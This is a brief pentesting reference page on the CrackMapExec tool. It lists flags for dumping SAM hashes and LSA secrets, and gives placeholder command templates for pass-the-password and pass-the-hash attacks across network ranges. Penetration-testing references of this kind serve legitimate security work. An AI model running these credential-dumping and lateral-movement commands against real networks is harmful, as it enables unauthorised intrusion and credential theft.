---
title: CRACKMAPEXEC
summary: A swiss army knife for pentesting networks.
description: A swiss army knife for pentesting networks.
---

**[https://github.com/Porchetta-Industries/CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)**

## Resources

* Workshop CrackMapExec LeHack 2023 Writeup - BOUYAICHE RAYAN
  https://www.rayanle.cat/write-up-workshop-cme-lehack-2023/

## Flags


 > 
 > **<font color=red>--sam</font>**</br>
 > Dump SAM hashes.
 > 
 > **<font color=red>--lsa</font>**</br>
 > Dump LSA Secrets.

## Pass the Password


 > 
 > **<font color=red>crackmapexec smb</font> \[TARGET_NETWORK_ADDRESS\]<font color=red>/</font>\[TARGET_CIDR\] <font color=red>-d</font> \[TARGET_DOMAIN\] <font color=red>-u</font> \[mySamName\] <font color=red>-p</font> \[myUserPassword\]**</br>
 > Pass the Password around the network to find pwnable machines.

![tool-crackmapexec-example.png](../attachments/tool-crackmapexec-example.png)

## Pass the Hash (NT)


 > 
 > **<font color=red>crackmapexec smb </font>\[TARGET_NETWORK_ADDRESS\]<font color=red>/</font>\[TARGET_CIDR\] <font color=red>-u</font> \[mySamName\] <font color=red>-H</font> \[myUserNTHASH\] <font color=red>--local-auth</font>**</br>
 > Pass the Hash attack (NT Hash) around the network to find vulnerable machines.
